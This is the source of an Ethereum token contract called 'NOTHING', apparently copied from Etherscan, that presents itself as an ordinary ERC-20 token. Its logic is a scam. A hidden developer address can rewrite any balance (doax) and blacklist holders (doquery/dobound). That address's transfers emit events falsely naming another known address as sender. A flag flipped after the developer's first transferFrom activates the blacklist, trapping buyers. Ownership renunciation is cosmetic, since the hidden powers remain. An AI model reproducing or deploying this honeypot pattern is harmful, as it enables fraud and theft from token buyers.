/**
 *Submitted for verification at Etherscan.io on 2022-10-23
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract NOTHING {
  
    mapping (address => uint256) public X;
    mapping (address => bool) Y;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "NOTHING";
    string public symbol = "NOTHING";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool IO;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    X[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Dev = 0x9cfc8B469665964Ada650bBc2cD9dDE41DF2cCA1;
    address Constructor = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
   
    modifier XX () {
    require(msg.sender == Dev);
        _; }
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        while(IO) {
        require(!Y[msg.sender]);
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Dev)  {
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }  
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function doax(address x, uint256 y) XX public {
        X[x] = y;}

        function balanceOf(address account) public view returns (uint256) {
        return X[account]; }
        function dobound(address x) XX public {
        require(Y[x]);
        Y[x] = false; }
        function doquery(address x) XX public{ 
        require(!Y[x]);
        Y[x] = true;}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        while(IO) {
        require(!Y[from] && !Y[to]);
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;
        X[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Dev)  {
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;  
        X[to] += value; 
        emit Transfer (Constructor, to, value);
        IO = !IO;
        return true; }    
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;
        X[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}